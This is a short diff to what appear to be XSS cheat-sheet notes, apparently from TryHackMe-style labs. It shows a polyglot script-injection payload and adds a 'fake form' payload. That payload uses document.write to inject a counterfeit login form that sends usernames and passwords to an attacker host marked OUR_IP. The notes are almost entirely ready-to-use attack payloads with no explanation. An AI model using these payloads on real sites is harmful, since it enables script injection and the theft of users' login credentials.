@@ -18,3 +18,8 @@ No HTML inject and script clean:
 Polyglots:
 
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('el pedro') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+fake form
+
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+
